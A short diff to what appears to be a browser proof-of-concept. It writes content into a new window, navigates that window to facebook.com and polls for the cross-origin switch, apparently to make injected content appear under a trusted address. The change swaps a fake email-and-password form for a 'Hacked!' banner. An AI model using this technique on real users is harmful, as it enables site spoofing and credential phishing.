@@ -5,7 +5,7 @@
 
   function f() {
     w = window.open("");
-    w.document.write('<input type="test" value="test@gmail.com"><br><input type="text" value="password"><br><button type="submit">Send</button>');
+    w.document.write('<h1 style="color:red">Hacked!</h1>');
     w.location = "https://facebook.com";
     i = setInterval("try { x = w.location.href; } catch(e) { clearInterval(i); next(); }", 1); 
   }
